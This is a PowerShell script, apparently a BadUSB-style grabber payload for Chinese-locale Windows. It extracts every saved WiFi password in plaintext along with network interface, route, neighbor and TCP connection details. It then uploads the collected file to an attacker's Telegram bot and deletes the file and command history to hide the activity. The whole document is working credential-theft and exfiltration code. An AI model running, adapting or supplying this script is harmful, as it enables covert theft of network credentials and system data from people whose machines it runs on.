# Get-Network-Info_zh-CN
Set-StrictMode -Off
$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "SilentlyContinue"
$PSDefaultParameterValues['Out-File:Encoding'] = 'ascii'

$token = "YOUR_BOT_TOKEN_FOR_TELEGRAM"
$url = "https://api.telegram.org/bot$token"
$outpath = "$env:TEMP/netinfo.txt"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

while($chatID.length -eq 0){
    $updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
    if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
    if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id}}
    sleep 5
}

$charCodes = @(0x2705, 0x1F4BB, 0x274C, 0x1F55C, 0x1F50D, 0x1F517, 0x23F8)
$chars = $charCodes | ForEach-Object { [char]::ConvertFromUtf32($_) }
$tick, $comp, $closed, $waiting, $glass, $cmde, $pause = $chars
Function Post-Message{$script:params = @{chat_id = $chatID ;text = $contents};Invoke-WebRequest -Uri ($url + "/sendMessage") -Method POST -Body $params | Out-Null}
Function Post-File{$filename = ($outpath).Split('\')[-1];$fileBytes = [System.IO.File]::ReadAllBytes($outpath);$fileEncoding = [System.Text.Encoding]::GetEncoding(0).GetString($fileBytes);$boundary = [System.Guid]::NewGuid().ToString(); $LF = "`r`n";$bodyLines = ( "--$boundary","Content-Disposition: form-data; name=`"chat_id`"$LF","$chatID$LF","--$boundary","Content-Disposition: form-data; name=`"document`"; filename=`"$filename`"","Content-Type: application/octet-stream$LF","$fileEncoding","--$boundary--$LF" ) -join $LF;Invoke-WebRequest -Uri ($url + "/sendDocument") -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines | Out-Null}

$contents = "$comp Gathering System Network Information for $env:COMPUTERNAME $comp"
Post-Message

"All WiFi Tokens:" | Out-File -FilePath $outpath -Append
netsh wlan show profile | Select-String '(?<=所有用户配置文件\s+:\s).+' | ForEach-Object {
    $ssid = [string]$_.Matches.Value
    $psk = [string](netsh wlan show profile $_.Matches.Value key=clear | Select-String '(?<=关键内容\s+:\s).+') | ForEach-Object { $_ -replace ".*:\s+", "" }
    Write-Output ("SSID: $ssid | PSK: $psk")
} | Out-File -FilePath $outpath -Append

"All Network Interfaces:" | Out-File -FilePath $outpath -Append
Get-NetIPInterface | Out-File -FilePath $outpath -Append

"Network IP Configuration:" | Out-File -FilePath $outpath -Append
Get-NetIPConfiguration | Out-File -FilePath $outpath -Append

"Network Route Configuration:" | Out-File -FilePath $outpath -Append
Get-NetRoute | Out-File -FilePath $outpath -Append

"Network Neighbor Configuration:" | Out-File -FilePath $outpath -Append
Get-NetNeighbor | Out-File -FilePath $outpath -Append

"Network TCP Connections:" | Out-File -FilePath $outpath -Append
Get-NetTCPConnection | Out-File -FilePath $outpath -Append

Post-File

Clear-History
Remove-Item -Path $outpath
